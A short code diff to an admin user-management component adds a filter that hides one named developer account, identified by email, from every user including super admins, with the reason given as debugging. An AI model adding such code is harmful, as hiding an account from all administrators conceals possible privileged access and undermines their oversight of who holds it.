@@ -170,6 +170,8 @@ export function AdminUsersClient({ branches, aeList, subsidiaries, deleteRequest
     return [...users]
       // Hide super_admin accounts from non-super-admins (mirrors original behaviour)
       .filter(u => isSuperAdmin || u.portalRole !== 'super_admin')
+      // Hide dev/programmer account from everyone (used for system debugging only)
+      .filter(u => u.email !== 'melwin@esprintmedia.com')
       .sort((a, b) => {
         const levelA = getAccessLevel(a);
         const levelB = getAccessLevel(b);
